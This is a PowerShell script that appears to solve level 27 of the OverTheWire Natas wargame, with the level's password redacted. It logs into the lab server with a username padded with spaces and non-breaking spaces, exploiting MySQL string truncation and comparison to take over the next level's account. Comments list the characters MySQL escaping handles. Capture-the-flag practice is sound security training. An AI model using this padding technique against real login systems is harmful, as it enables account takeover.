. "../natas_filter.ps1"
. "../getCookieValueFromKey.ps1"

$server = "natas27.natas.labs.overthewire.org"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas27"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}


$s = [char]0xA0 #non-break space
$param = "?username=natas28$s$s$s$s$s$s$s$s&password=hi"

(Invoke-WebRequest -Headers $headers -URI ($url + $param)  -SessionVariable sessVar).Content

$param = "?username=natas28        &password=hi"
(Invoke-WebRequest -Headers $headers -URI ($url + $param) -WebSession $sessVar).Content


<#
--------------------------
    mysqli_real_escape_string
--------------------------
    00 = \0 (NUL)
    0A = \n
    0D = \r
    1A = ctl-Z
    22 = "
    27 = '
    5C = \
--------------------------

The original MySQL `utf8` character-set (for tables and fields) only supports 3-byte sequences.
4-byte characters are not common, but I've had queries fail to execute on 4-byte UTF-8 characters, so you should be using `utf8mb4` wherever possible.

#>